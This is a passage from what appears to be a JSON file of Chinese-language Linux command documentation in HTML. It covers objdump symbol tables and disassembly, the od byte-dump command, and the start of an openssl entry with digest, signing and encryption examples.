\n<span class=\"hljs-number\">00000000</span> l    d  .debug_line    <span class=\"hljs-number\">00000000</span> .debug_line \n<span class=\"hljs-number\">00000000</span> l    d  .debug_frame   <span class=\"hljs-number\">00000000</span> .debug_frame \n<span class=\"hljs-number\">00000000</span> l    d  .debug_loc     <span class=\"hljs-number\">00000000</span> .debug_loc \n<span class=\"hljs-number\">00000000</span> l    d  .debug_pubnames        <span class=\"hljs-number\">00000000</span> .debug_pubnames \n<span class=\"hljs-number\">00000000</span> l    d  .debug_aranges <span class=\"hljs-number\">00000000</span> .debug_aranges \n<span class=\"hljs-number\">00000000</span> l    d  .note.GNU-stack        <span class=\"hljs-number\">00000000</span> .note.GNU-stack \n<span class=\"hljs-number\">00000000</span> l    d  .comment       <span class=\"hljs-number\">00000000</span> .comment \n<span class=\"hljs-number\">00000000</span> g     F .text  <span class=\"hljs-number\">0000000</span>c _Z9printTestv \n<span class=\"hljs-number\">00000000</span>         *UND*  <span class=\"hljs-number\">00000000</span> __gxx_personality_v0 \n<span class=\"hljs-number\">0000000</span>c g     F .text  <span class=\"hljs-number\">00000013</span> _Z10printTest2v \n</code></pre>\n<p>这里，输出的信息类似<code>nm -s</code>命令的输出，相比较之下，nm命令的输出如下：&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-punctuation\">[</span>root<span class=\"hljs-operator\">@</span>localhost test<span class=\"hljs-punctuation\">]</span><span class=\"hljs-comment\"># nm -s mytest.o </span>\n<span class=\"hljs-number\">0000000</span><span class=\"hljs-built_in\">c</span> <span class=\"hljs-built_in\">T</span> _Z10printTest2v \n<span class=\"hljs-number\">00000000</span> <span class=\"hljs-built_in\">T</span> _Z9printTestv \n         U __gxx_personality_v0 \n</code></pre>\n<p> **显示文件的符号表入口，将底层符号解码并表示成用户级别:&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]# objdump -t -C mytest.o \nmytest.o:     file format elf32-i386 \nSYMBOL TABLE: \n<span class=\"hljs-number\">00000000</span> l    df *ABS*  <span class=\"hljs-number\">00000000</span> mytest.cpp \n<span class=\"hljs-number\">00000000</span> l    d  .text  <span class=\"hljs-number\">00000000</span> .text \n<span class=\"hljs-number\">00000000</span> l    d  .data  <span class=\"hljs-number\">00000000</span> .data \n<span class=\"hljs-number\">00000000</span> l    d  .bss   <span class=\"hljs-number\">00000000</span> .bss \n<span class=\"hljs-number\">00000000</span> l    d  .debug_abbrev  <span class=\"hljs-number\">00000000</span> .debug_abbrev \n<span class=\"hljs-number\">00000000</span> l    d  .debug_info    <span class=\"hljs-number\">00000000</span> .debug_info \n<span class=\"hljs-number\">00000000</span> l    d  .debug_line    <span class=\"hljs-number\">00000000</span> .debug_line \n<span class=\"hljs-number\">00000000</span> l    d  .debug_frame   <span class=\"hljs-number\">00000000</span> .debug_frame \n<span class=\"hljs-number\">00000000</span> l    d  .debug_loc     <span class=\"hljs-number\">00000000</span> .debug_loc \n<span class=\"hljs-number\">00000000</span> l    d  .debug_pubnames        <span class=\"hljs-number\">00000000</span> .debug_pubnames \n<span class=\"hljs-number\">00000000</span> l    d  .debug_aranges <span class=\"hljs-number\">00000000</span> .debug_aranges \n<span class=\"hljs-number\">00000000</span> l    d  .note.GNU-stack        <span class=\"hljs-number\">00000000</span> .note.GNU-stack \n<span class=\"hljs-number\">00000000</span> l    d  .comment       <span class=\"hljs-number\">00000000</span> .comment \n<span class=\"hljs-number\">00000000</span> g     F .text  <span class=\"hljs-number\">0000000</span>c printTest() \n<span class=\"hljs-number\">00000000</span>         *UND*  <span class=\"hljs-number\">00000000</span> __gxx_personality_v0 \n<span class=\"hljs-number\">0000000</span>c g     F .text  <span class=\"hljs-number\">00000013</span> printTest2() \n</code></pre>\n<p>这里，和没-C相比，printTest2函数可读性增加了。&nbsp;</p>\n<p> **反汇编目标文件的特定机器码段：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-title\">@localhost</span> test]# objdump -d mytest.o \nmytest.o:     file format elf<span class=\"hljs-number\">32</span>-<span class=\"hljs-type\">i386</span> \nDisassembly of <span class=\"hljs-keyword\">section</span> .text: \n\n<span class=\"hljs-number\">00000000</span> &lt;_Z<span class=\"hljs-number\">9</span>printTestv&gt;: \n   <span class=\"hljs-number\">0</span>:   <span class=\"hljs-number\">55</span>                      push   <span class=\"hljs-variable\">%ebp</span> \n   <span class=\"hljs-number\">1</span>:   <span class=\"hljs-number\">89</span> e<span class=\"hljs-number\">5</span>                   mov    <span class=\"hljs-variable\">%esp</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-variable\">%ebp</span> \n   <span class=\"hljs-number\">3</span>:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-keyword\">sub</span>    $<span class=\"hljs-number\">0x10</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-variable\">%esp</span> \n   <span class=\"hljs-number\">6</span>:   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">6</span> <span class=\"hljs-number\">45</span> ff <span class=\"hljs-number\">61</span>             movb   $<span class=\"hljs-number\">0x61</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-number\">0xffffffff</span>(<span class=\"hljs-variable\">%ebp</span>) \n<span class=\"hljs-symbol\">   a:</span>   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9</span>                      leave  \n<span class=\"hljs-symbol\">  b:</span>   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">3</span>                      <span class=\"hljs-keyword\">ret</span>    \n\n<span class=\"hljs-number\">0000000</span><span class=\"hljs-keyword\">c</span> &lt;_Z<span class=\"hljs-number\">10</span>printTest<span class=\"hljs-number\">2</span>v&gt;: \n<span class=\"hljs-symbol\">   c:</span>   <span class=\"hljs-number\">55</span>                      push   <span class=\"hljs-variable\">%ebp</span> \n<span class=\"hljs-symbol\">   d:</span>   <span class=\"hljs-number\">89</span> e<span class=\"hljs-number\">5</span>                   mov    <span class=\"hljs-variable\">%esp</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-variable\">%ebp</span> \n<span class=\"hljs-symbol\">   f:</span>   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                <span class=\"hljs-keyword\">sub</span>    $<span class=\"hljs-number\">0x10</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-variable\">%esp</span> \n  <span class=\"hljs-number\">12</span>:   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">7</span> <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>    movl   $<span class=\"hljs-number\">0x2</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-number\">0xfffffffc</span>(<span class=\"hljs-variable\">%ebp</span>) \n  <span class=\"hljs-number\">19</span>:   <span class=\"hljs-number\">83</span> <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span>             addl   $<span class=\"hljs-number\">0x2</span><span class=\"hljs-punctuation\">,</span><span class=\"hljs-number\">0xfffffffc</span>(<span class=\"hljs-variable\">%ebp</span>) \n  <span class=\"hljs-number\">1</span>d:   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">9</span>                      leave  \n  <span class=\"hljs-number\">1</span>e:   <span class=\"hljs-keyword\">c</span><span class=\"hljs-number\">3</span>                      <span class=\"hljs-keyword\">ret</span>    \n</code></pre>\n<p>这里，对text段的内容进行了反汇编。&nbsp;</p>\n<p> **反汇编特定段，并将汇编代码对应的文件名称和行号对应上：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]<span class=\"hljs-comment\"># objdump -d -l mytest.o</span>\nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n\n<span class=\"hljs-number\">00000000</span> &lt;_Z9printTestv&gt;: \n_Z9printTestv(): \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">1</span> \n   <span class=\"hljs-number\">0</span>:   <span class=\"hljs-number\">55</span>                      push   %ebp \n   <span class=\"hljs-number\">1</span>:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   <span class=\"hljs-number\">3</span>:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                sub    <span class=\"hljs-variable\">$0x10</span>,%esp \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">4</span> \n   <span class=\"hljs-number\">6</span>:   c6 <span class=\"hljs-number\">45</span> ff <span class=\"hljs-number\">61</span>             movb   <span class=\"hljs-variable\">$0x61</span>,<span class=\"hljs-number\">0</span>xffffffff(%ebp) \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">5</span> \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n<span class=\"hljs-number\">0000000</span>c &lt;_Z10printTest2v&gt;: \n_Z10printTest2v(): \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">6</span> \n   c:   <span class=\"hljs-number\">55</span>                      push   %ebp \n   d:   <span class=\"hljs-number\">89</span> e5                   mov    %esp,%ebp \n   f:   <span class=\"hljs-number\">83</span> ec <span class=\"hljs-number\">10</span>                sub    <span class=\"hljs-variable\">$0x10</span>,%esp \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">8</span> \n  <span class=\"hljs-number\">12</span>:   c7 <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>    movl   <span class=\"hljs-variable\">$0x2</span>,<span class=\"hljs-number\">0</span>xfffffffc(%ebp) \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">9</span> \n  <span class=\"hljs-number\">19</span>:   <span class=\"hljs-number\">83</span> <span class=\"hljs-number\">45</span> fc <span class=\"hljs-number\">02</span>             addl   <span class=\"hljs-variable\">$0x2</span>,<span class=\"hljs-number\">0</span>xfffffffc(%ebp) \n<span class=\"hljs-regexp\">/root/</span>test<span class=\"hljs-regexp\">/04_libraryTest/my</span>test.cpp:<span class=\"hljs-number\">10</span> \n  <span class=\"hljs-number\">1</span>d:   c9                      leave  \n  <span class=\"hljs-number\">1</span>e:   c3                      ret    \n</code></pre>\n<p>这里，项\"-d\"从objfile中反汇编那些特定指令机器码的section，而使用\"-l\"指定用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用，使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。&nbsp;</p>\n<p> **显示目标文件各个段的头部摘要信息：&nbsp;** </p>\n<pre><code class=\"language-shell\">[root@localhost test]<span class=\"hljs-comment\"># objdump -h mytest.o </span>\nmytest.o:     file format elf32-i386 \n\nSections: \nIdx Name          Size      VMA       LMA       File off  Algn \n <span class=\"hljs-number\"> 0 </span>.text         0000001f <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000034 </span> 2**2 \n                  CONTENTS, ALLOC, LOAD, readonly, CODE \n <span class=\"hljs-number\"> 1 </span>.data        <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000054 </span> 2**2 \n                  CONTENTS, ALLOC, LOAD, DATA \n <span class=\"hljs-number\"> 2 </span>.bss         <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000054 </span> 2**2 \n                  ALLOC \n <span class=\"hljs-number\"> 3 </span>.debug_abbrev<span class=\"hljs-number\"> 00000046 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000054 </span> 2**0 \n                  CONTENTS, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 4 </span>.debug_info   000000ed <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span> 0000009a  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 5 </span>.debug_line   0000003e <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000187 </span> 2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 6 </span>.debug_frame <span class=\"hljs-number\"> 00000044 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span> 000001c8  2**2 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 7 </span>.debug_loc   <span class=\"hljs-number\"> 00000058 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span> 0000020c  2**0 \n                  CONTENTS, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 8 </span>.debug_pubnames 0000002f <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000264 </span> 2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n <span class=\"hljs-number\"> 9 </span>.debug_aranges<span class=\"hljs-number\"> 00000020 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000293 </span> 2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n10 .comment      0000002e <span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span> 000002b3  2**0 \n                  CONTENTS, READONLY \n11 .note.GNU-stack<span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span><span class=\"hljs-number\"> 00000000 </span> 000002e1  2**0 \n                  CONTENTS, READONLY \n</code></pre>\n<p>这里，更多的内容参见<code>man objdump</code>中的这个选项。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "od",
        "des": "输出文件的八进制、十六进制等格式编码的字节",
        "body": "<h1 id=\"od\">od</h1>\n<p>输出文件的八进制、十六进制等格式编码的字节</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>od命令</strong> 用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。</p>\n<p>常见的文件为文本文件和二进制文件。此命令主要用来查看保存在二进制文件中的值。比如，程序可能输出大量的数据记录，每个数据是一个单精度浮点数。这些数据记录存放在一个文件中，如果想查看下这个数据，这时候od命令就派上用场了。在我看来，od命令主要用来格式化输出文件数据，即对文件中的数据进行无二义性的解释。不管是IEEE754格式的浮点数还是ASCII码，od命令都能按照需求输出它们的值。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">od</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：此参数的效果和同时指定“-ta”参数相同；</span>\n<span class=\"hljs-deletion\">-A：&lt;字码基数&gt;：选择以何种基数计算字码；</span>\n<span class=\"hljs-deletion\">-b：此参数的效果和同时指定“-toC”参数相同；</span>\n<span class=\"hljs-deletion\">-c：此参数的效果和同时指定“-tC”参数相同；</span>\n<span class=\"hljs-deletion\">-d：此参数的效果和同时指定“-tu2”参数相同；</span>\n<span class=\"hljs-deletion\">-f：此参数的效果和同时指定“-tfF”参数相同；</span>\n<span class=\"hljs-deletion\">-h：此参数的效果和同时指定“-tx2”参数相同；</span>\n<span class=\"hljs-deletion\">-i：此参数的效果和同时指定“-td2”参数相同；</span>\n<span class=\"hljs-deletion\">-j&lt;字符数目&gt;或--skip-bytes=&lt;字符数目&gt;：略过设置的字符数目；</span>\n<span class=\"hljs-deletion\">-l：此参数的效果和同时指定“-td4”参数相同；</span>\n<span class=\"hljs-deletion\">-N&lt;字符数目&gt;或--read-bytes=&lt;字符数目&gt;：到设置的字符树目为止；</span>\n<span class=\"hljs-deletion\">-o：此参数的效果和同时指定“-to2”参数相同；</span>\n<span class=\"hljs-deletion\">-s&lt;字符串字符数&gt;或--strings=&lt;字符串字符数&gt;：只显示符合指定的字符数目的字符串；</span>\n<span class=\"hljs-deletion\">-t&lt;输出格式&gt;或--format=&lt;输出格式&gt;：设置输出格式；</span>\n<span class=\"hljs-deletion\">-v或--output-duplicates：输出时不省略重复的数据；</span>\n<span class=\"hljs-deletion\">-w&lt;每列字符数&gt;或--width=&lt;每列字符数&gt;：设置每列的最大字符数；</span>\n<span class=\"hljs-deletion\">-x：此参数的效果和同时指定“-h”参数相同；</span>\n<span class=\"hljs-deletion\">--help：在线帮助；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要显示的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[linuxde<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-variable\">$ </span>echo abcdef g &gt; tmp\n[linuxde<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-variable\">$ </span>cat tmp\nabc<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">g</span></span>\n</code></pre>\n<p>说明：先准备一个tmp文件</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -b tmp\n<span class=\"hljs-number\">0000000 141</span> <span class=\"hljs-number\">142 143 144 145</span> <span class=\"hljs-number\">146 040 147</span> <span class=\"hljs-number\">012</span>\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：使用单字节八进制解释进行输出，注意左侧的默认地址格式为八字节</p>\n<pre><code class=\"language-shell\">[linuxde<span class=\"hljs-title\">@localhost</span> ~]$ od -<span class=\"hljs-keyword\">c</span> tmp\n<span class=\"hljs-number\">0000000</span>   a   b   <span class=\"hljs-keyword\">c</span>   d   e   f       g  \\n\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：使用ASCII码进行输出，注意其中包括转义字符</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -t d1 tmp\n0000000  <span class=\"hljs-number\"> 97 </span> <span class=\"hljs-number\"> 98 </span> <span class=\"hljs-number\"> 99 </span><span class=\"hljs-number\"> 100 </span><span class=\"hljs-number\"> 101 </span><span class=\"hljs-number\"> 102 </span> <span class=\"hljs-number\"> 32 </span><span class=\"hljs-number\"> 103 </span>  10\n0000011\n</code></pre>\n<p>说明：使用单字节十进制进行解释</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -<span class=\"hljs-keyword\">A</span> d -c tmp\n<span class=\"hljs-number\">0000000</span>   a   b   c   d   e   f       g  \\n\n<span class=\"hljs-number\">0000009</span>\n</code></pre>\n<p>说明：设置地址格式为十进制。</p>\n<pre><code class=\"language-shell\">[linuxde<span class=\"hljs-title\">@localhost</span> ~]$ od -A <span class=\"hljs-keyword\">x</span> -<span class=\"hljs-keyword\">c</span> tmp\n<span class=\"hljs-number\">000000</span>   a   b   <span class=\"hljs-keyword\">c</span>   d   e   f       g  \\n\n<span class=\"hljs-number\">000009</span>\n</code></pre>\n<p>说明：设置地址格式为十六进制</p>\n<pre><code class=\"language-shell\">[linuxde<span class=\"hljs-title\">@localhost</span> ~]$ od -j <span class=\"hljs-number\">2</span> -<span class=\"hljs-keyword\">c</span> tmp\n<span class=\"hljs-number\">0000002</span>   <span class=\"hljs-keyword\">c</span>   d   e   f       g  \\n\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：跳过开始的两个字节</p>\n<pre><code class=\"language-shell\">[linuxde<span class=\"hljs-title\">@localhost</span> ~]$ od -N <span class=\"hljs-number\">2</span> -j <span class=\"hljs-number\">2</span> -<span class=\"hljs-keyword\">c</span> tmp\n<span class=\"hljs-number\">0000002</span>   <span class=\"hljs-keyword\">c</span>   d\n<span class=\"hljs-number\">0000004</span>\n</code></pre>\n<p>说明：跳过开始的两个字节，并且仅输出两个字节</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -w1 -c tmp\n<span class=\"hljs-number\">0000000</span>   a\n<span class=\"hljs-number\">0000001</span>   b\n<span class=\"hljs-number\">0000002</span>   c\n<span class=\"hljs-number\">0000003</span>   d\n<span class=\"hljs-number\">0000004</span>   e\n<span class=\"hljs-number\">0000005</span>   f\n<span class=\"hljs-number\">0000006</span>   \n<span class=\"hljs-number\">0000007</span>   g\n<span class=\"hljs-number\">0000010</span>  \\n\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：每行仅输出1个字节</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -w2 -c tmp\n<span class=\"hljs-number\">0000000</span>   a   b\n<span class=\"hljs-number\">0000002</span>   c   d\n<span class=\"hljs-number\">0000004</span>   e   f\n<span class=\"hljs-number\">0000006</span>       g\n<span class=\"hljs-number\">0000010</span>  \\n\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：每行输出两个字节</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ od -w3 -b tmp\n<span class=\"hljs-number\">0000000 141</span> <span class=\"hljs-number\">142 143</span>\n<span class=\"hljs-number\">0000003 144</span> <span class=\"hljs-number\">145 146</span>\n<span class=\"hljs-number\">0000006</span> <span class=\"hljs-number\">040 147</span> <span class=\"hljs-number\">012</span>\n<span class=\"hljs-number\">0000011</span>\n</code></pre>\n<p>说明：每行输出3个字节，并使用八进制单字节进行解释</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "openssl",
        "des": "强大的安全套接字层密码库",
        "body": "<h1 id=\"openssl\">openssl</h1>\n<p>强大的安全套接字层密码库</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>OpenSSL</strong> 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。在OpenSSL被曝出现严重安全漏洞后，发现多数通过SSL协议加密的网站使用名为OpenSSL的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。</p>\n<p>OpenSSL有两种运行模式：交互模式和批处理模式。</p>\n<p>直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。</p>\n<p>OpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。&nbsp;</p>\n<p> <strong>对称加密算法</strong></p>\n<p>OpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。&nbsp;</p>\n<p> <strong>非对称加密算法</strong></p>\n<p>OpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。&nbsp;</p>\n<p> <strong>信息摘要算法</strong></p>\n<p>OpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。&nbsp;</p>\n<p> <strong>密钥和证书管理</strong></p>\n<p>密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。&nbsp;</p>\n<p>首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。&nbsp;</p>\n<p>在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。&nbsp;</p>\n<p>事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。</p>\n<h3 id=\"实例\">实例</h3>\n<p><strong>1、使用 openssl 生成密码</strong></p>\n<p>几乎所有 Linux 发行版都包含 openssl。我们可以利用它的随机功能来生成可以用作密码的随机字母字符串。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">openssl</span> rand -base64 <span class=\"hljs-number\">10</span>\n<span class=\"hljs-comment\"># nU9LlHO5nsuUvw==</span>\n</code></pre>\n<p>nU9LlHO5nsuUvw==</p>\n<p><strong>2、消息摘要算法应用例子</strong></p>\n<p>用SHA1算法计算文件file.txt的哈西值，输出到stdout：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dgst -sha1 file.txt</span>\n</code></pre>\n<p>用SHA1算法计算文件file.txt的哈西值，输出到文件digest.txt：</p>\n<pre><code class=\"language-shell\"># openssl sha1 -<span class=\"hljs-keyword\">out</span> digest.txt <span class=\"hljs-keyword\">file</span>.txt\n</code></pre>\n<p>用DSS1(SHA1)算法为文件file.txt签名，输出到文件dsasign.bin。签名的private key必须为DSA算法产生的，保存在文件dsakey.pem中。</p>\n<pre><code class=\"language-shell\"># openssl dgst -dss1 -<span class=\"hljs-built_in\">sign</span> dsakey.pem -<span class=\"hljs-keyword\">out</span> dsasign.bin <span class=\"hljs-keyword\">file</span>.txt\n</code></pre>\n<p>用dss1算法验证file.txt的数字签名dsasign.bin，验证的private key为DSA算法产生的文件dsakey.pem。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt</span>\n</code></pre>\n<p>用sha1算法为文件file.txt签名,输出到文件rsasign.bin，签名的private key为RSA算法产生的文件rsaprivate.pem。</p>\n<pre><code class=\"language-shell\"># openssl sha1 -<span class=\"hljs-built_in\">sign</span> rsaprivate.pem -<span class=\"hljs-keyword\">out</span> rsasign.bin <span class=\"hljs-keyword\">file</span>.txt\n</code></pre>\n<p>用sha1算法验证file.txt的数字签名rsasign.bin，验证的public key为RSA算法生成的rsapublic.pem。</p>\n<pre><code class=\"language-shell\"># openssl sha1 -<span class=\"hljs-built_in\">verify</span> rsapublic.pem -signature rsasign.bin <span class=\"hljs-keyword\">file</span>.txt\n</code></pre>\n<p> <strong>3、对称加密应用例子</strong></p>\n<p>对称加密应用例子，用DES3算法的CBC模式加密文件plaintext.doc，加密结果输出到文件ciphertext.bin。</p>\n<pre><code class=\"language-shell\"># openssl <span class=\"hljs-keyword\">enc</span> -des3 -salt -<span class=\"hljs-keyword\">in</span> plaintext.doc -<span class=\"hljs-keyword\">out</span> ciphertext.bin\n</code></pre>\n<p>用DES3算法的OFB模式解密文件ciphertext.bin，提供的口令为trousers，输出到文件plaintext.doc。注意：因为模式不同，该命令不能对以上的文件进行解密。</p>\n<pre><code class=\"language-shell\"># openssl enc -des-ede3-ofb -d -<span class=\"hljs-keyword\">in</span> ciphertext.bin -<span class=\"hljs-keyword\">out</span> plaintext.doc -<span class=\"hljs-keyword\">pass</span> <span class=\"hljs-keyword\">pass</span>:trousers\n</code></pre>\n<p>用Blowfish的CFB模式加密plaintext.doc，口令从环境变量PASSWORD中取，输出到文件ciphertext.bin。</p>\n<pre><code class=\"language-shell\"># openssl <span class=\"hljs-keyword\">bf</span>-cfb -salt -in plaintext.doc -out ciphertext.bin -pass <span class=\"hljs-keyword\">en</span><span class=\"hljs-variable\">v:PASSWORD</span>\n</code></pre>\n<p>给文件ciphertext.bin用base64编码，输出到文件base64.txt。</p>\n<pre><code class=\"language-shell\"># openssl <span class=\"hljs-built_in\">base64</span> -<span class=\"hljs-keyword\">in</span> ciphertext.bin -out <span class=\"hljs-built_in\">base64</span>.txt\n</code></pre>\n<p>用RC5算法的CBC模式加密文件plaintext.doc，输出到文件ciphertext.bin，salt、key和初始化向量(iv)在命令行指定。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl rc5 -in plaintext.doc -out ciphertext.bin -S C62CB1D49F158ADC -iv E9EDACA1BD7090C6 -K 89D4B1678D604FAA3DBFFD030A314B29</span>\n</code></pre>\n<p> <strong>4、Diffie-Hellman应用例子</strong></p>\n<p>使用生成因子2和随机的1024-bit的素数产生D0ffie-Hellman参数，输出保存到文件dhparam.pem</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># openssl dhparam -out dhparam.pem -2 